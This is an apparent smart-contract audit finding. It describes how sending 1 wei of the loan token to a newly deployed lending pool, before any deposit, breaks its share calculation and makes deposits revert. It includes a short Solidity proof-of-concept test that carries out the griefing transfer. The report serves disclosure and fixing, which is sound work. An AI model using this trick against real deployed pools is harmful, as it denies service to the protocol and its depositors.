# Initialized pools can be disabled by attackers

## Summary

Attackers can disable pools by sending 1 wei of LOAN_TOKEN to them on initialization.

## Vulnerability Detail

When a pool is deployed, the tokenToShares function enters a special case to allow an initial deposit while there are zero outstanding shares.

However, after a pool is deployed but before any funds have been deposited, an attacker can gift/transfer 1wei of the LOAN_TOKEN to the pool. This causes the total supply of shares to be 0 while the loanTokenBalance is 1. The tokenToShares does not enter its special case because there is an outstanding loan token balance. The deposit function then reverts and the pool becomes useless.

The following test exemplifies this:

```solidity
 function testDepositSuccess() external {
        uint amount = 1e36;
        MockERC20 collateralToken = new MockERC20(0, 18);
        MockERC20 loanToken = new MockERC20(amount, 18);
        Pool pool = factory.deploySurgePool(IERC20(address(collateralToken)), IERC20(address(loanToken)), 1e18, 0.8e18, 1e15, 1e15, 0.1e18, 0.4e18, 0.6e18);

        // transfer 1 token directly to the pool, bypassing deposit logic
        loanToken.transfer(address(pool), 1);

        loanToken.approve(address(pool), amount);
        // pool is bricked, deposits cannot be made
        pool.deposit(amount/2);
}
```

This code should not revert, but does.

## Impact

DoS on pools, rendering them useless.
